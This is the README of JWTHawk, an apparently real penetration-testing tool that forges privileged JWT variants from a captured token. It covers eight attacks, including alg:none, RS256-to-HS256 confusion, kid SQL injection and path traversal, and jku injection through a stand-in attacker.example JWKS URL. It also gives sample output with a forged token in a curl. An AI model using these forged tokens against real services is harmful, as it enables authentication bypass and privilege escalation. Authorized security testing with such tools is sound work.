# JWTHawk : Mint Privileged JWT Variants from a Captured Token

You captured a JWT from Burp. The next sixty seconds should be: try eight known signature-bypass and impersonation attacks against the issuing service, paste a curl, watch for the `200 admin` that proves the bypass. `JWTHawk` does the eight mints on the captured token, prints a per-attack diff so you see exactly what changed, and emits a copy-paste curl with your captured request shape and the forged token slotted in.

[![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue.svg)](https://www.python.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Status: active](https://img.shields.io/badge/status-active-brightgreen.svg)](#)

## Overview

JWT bugs cluster around three failure modes: the verification skips on `alg: none` or empty signature, the verification trusts an attacker-controlled signing key (`kid` lookup, `jku` URL, RS-to-HS confusion), or the payload is mutated freely once any of the above lands. The mints are mechanical, the value is in pasting them at speed and reading the response.

`JWTHawk` reads the captured token, runs eight attacks in one shot, and shows each as a unified diff: red `-` for the original header/payload field, green `+` for the mutation. Beneath the diff sits the new token and, when you supply `--target-curl 'curl ... {TOKEN}'`, the substituted curl. Three attacks (alg confusion, kid SQLi, kid path traversal) re-sign with HMAC; two (alg:none, empty-sig) just truncate the signature; one (jku injection) prints a placeholder you finish off with your own RSA key.

## Features

- Eight attacks on every run: `alg:none`, `empty-sig`, `RS256→HS256` confusion, `kid` SQLi, `kid` path traversal, `jku` URL injection, role escalation, `exp` extension
- Diff-style output (`-`/`+` per changed field) so the surgical change is impossible to miss
- `--target-curl` template with `{TOKEN}` placeholder substitutes the forged token into your captured request shape per attack
- `--pubkey` switches the alg-confusion attack from a placeholder to a real HMAC over the literal RSA public key bytes (the canonical surgical case)
- Standard library only: `base64`, `hmac`, `hashlib`, `json`. No PyJWT, no `cryptography`.

## Installation

```bash
git clone https://github.com/daniyalnasir-root/JWTHawk.git
cd JWTHawk
python3 jwthawk.py -h
```

No `pip install`.

## Usage

```bash
# Captured token, captured curl shape — eight attacks in one go
python3 jwthawk.py \
    --token "eyJhbGciOiJIUzI1NiIs..." \
    --target-curl "curl -H 'Authorization: Bearer {TOKEN}' https://api.example.com/me"

# Real RS256 token + the issuing service's public key for the surgical alg-confusion mint
python3 jwthawk.py \
    --token "$(cat captured.jwt)" \
    --pubkey ./issuer-pub.pem \
    --target-curl @./api-me.curl

# Custom attacker JWKS host for the jku-injection mint
python3 jwthawk.py \
    --token "$(cat captured.jwt)" \
    --jku-url "https://attacker.example/.well-known/jwks.json"
```

## Command Line Options

| Flag | Required | Description |
|------|----------|-------------|
| `--token` | yes | The captured JWT (header.payload.signature) |
| `--target-curl` | no | curl template with `{TOKEN}` placeholder; tool prints substituted variant per attack |
| `--pubkey` | no | RSA public key PEM file; required for the surgical alg-confusion attack |
| `--jku-url` | no | Attacker-controlled JWKS URL for the jku-injection attack (default `https://attacker.example/.well-known/jwks.json`) |

## Output Example

```
$ python3 jwthawk.py --token eyJhbGciOi... \
                     --target-curl "curl -H 'Authorization: Bearer {TOKEN}' https://api.example.com/me"

JWTHawk  158-byte token, HS256 baseline
  baseline header  {"alg": "HS256", "typ": "JWT", "kid": "k1"}
  baseline payload {"sub": "alice", "role": "user", "exp": 1900000000}
  signature        32 bytes (64281EDA4ACE1ECD...)

attack: alg:none
why:    server treats `none` as a valid algorithm and skips signature verification

--- header (original)
+++ header (mutated)
- alg: "HS256"
+ alg: "none"
  kid: "k1"
  typ: "JWT"

  note: signature stripped to empty string

  token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIiwia2lkIjoiazEifQ.eyJzdWIiOiJhbGl...
  curl:  curl -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldU...' https://api.example.com/me
```

The full eight-attack output of two runs lives in [`examples/`](examples/).

## Legal Disclaimer

This tool is for authorized security testing and educational use only.
Run it only against systems you own or have explicit written permission to test.
The author accepts no liability for misuse. Unauthorized use may violate
local, state, or federal law.

## Author

**Daniyal Nasir** is a Doha-based VAPT Consultant and Penetration Tester with 10+ years in offensive security: bug bounty disclosures across Fortune-500 programs, full-stack web app pentesting, and responsible vulnerability research. Certifications: OSCP, LPT, CPENT, CEH, CISA, CISM, CASP+.

- https://www.linkedin.com/in/daniyalnasir
- https://www.daniyalnasir.com

## License

MIT, see [LICENSE](LICENSE).
